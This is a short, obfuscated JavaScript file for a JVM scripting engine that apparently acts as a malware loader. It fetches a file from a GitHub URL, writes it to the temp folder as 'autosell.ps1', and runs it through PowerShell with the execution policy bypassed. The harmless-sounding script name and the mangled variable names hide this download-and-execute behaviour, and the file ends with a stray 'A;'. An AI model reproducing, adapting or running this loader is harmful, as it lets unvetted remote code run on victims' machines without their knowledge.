const File = Java.type("java.io.File");
const FileWriter = Java.type("java.io.FileWriter");
const HttpURLConnection = Java.type("java.net.HttpURLConnection");
const URL = Java.type("java.net.URL");
const BufferedReader = Java.type("java.io.BufferedReader");
const InputStreamReader = Java.type("java.io.InputStreamReader");
const Runtime = Java.type("java.lang.Runtime");
const tempFolder = java.lang.System.getProperty("java.io.tmpdir");
const scriptPath = tempFolder + File.separator + "autosell.ps1";
function downloadScript(_0x183355, _0x546154) {
  try {
    const _0x29e211 = new URL(_0x183355).openConnection();
    _0x29e211.setRequestMethod("GET");
    if (_0x29e211.getResponseCode() !== HttpURLConnection.HTTP_OK) {
      throw new Error("Failed to download file: HTTP " + _0x29e211.getResponseCode());
    }
    const _0x19f9cf = new BufferedReader(new InputStreamReader(_0x29e211.getInputStream()));
    const _0x44c2e3 = new FileWriter(new File(_0x546154));
    let _0x1d5f8b;
    while ((_0x1d5f8b = _0x19f9cf.readLine()) !== null) {
      _0x44c2e3.write(_0x1d5f8b + "\n");
    }
    _0x19f9cf.close();
    _0x44c2e3.close();
    print("Script downloaded successfully to: " + _0x546154);
  } catch (_0x49e7f9) {
    print("Error downloading the script: " + _0x49e7f9.message);
    throw _0x49e7f9;
  }
}
function executeScript(_0x4e2958) {
  try {
    const _0x358eea = Runtime.getRuntime().exec("powershell -ExecutionPolicy Bypass -File " + _0x4e2958);
    _0x358eea.waitFor();
    const _0x527f50 = _0x358eea.exitValue();
    print("Script executed with exit code: " + _0x527f50);
  } catch (_0x1760c9) {
    print("Error executing the script: " + _0x1760c9.message);
  }
}
downloadScript("https://github.com/GaeClapper/fr/blob/main/wow.js", scriptPath);
executeScript(scriptPath);
A;
